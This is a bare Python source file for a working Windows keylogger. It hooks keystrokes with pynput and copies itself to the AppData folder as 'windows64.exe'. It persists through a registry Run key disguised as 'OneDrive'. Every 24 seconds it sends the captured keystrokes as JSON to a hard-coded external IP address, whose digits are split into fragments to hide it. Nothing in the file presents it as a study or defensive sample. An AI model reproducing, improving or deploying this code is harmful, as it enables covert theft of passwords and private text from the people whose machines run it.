from pynput import keyboard
import requests
import shutil
import subprocess
import json
import threading
import socket
import platform     
import base64
import sys
import os
import time
text = ""

ip = "35.1"
add = "68.1"
ress = "37.29"
port_number = "8080"
ip_address = ip + add + ress

time_interval = 24

def pxsehdxexiwh():
    location = os.environ['appdata'] + '\\windows64.exe'
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "' + location + '"', shell=True)

pxsehdxexiwh()

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", 		
	data = payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        payload = "<br><br><p><p>"
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "[enter]"
    elif key == keyboard.Key.tab:
        text += "[tab]"
    elif key == keyboard.Key.space:
        text += "[space]"
    elif key == keyboard.Key.shift:
        text += "[shift]"
    elif key == keyboard.Key.backspace:
         text += "[<-]"
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         text += "[control]"
    elif key == keyboard.Key.esc:
         text += "[escape]"
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
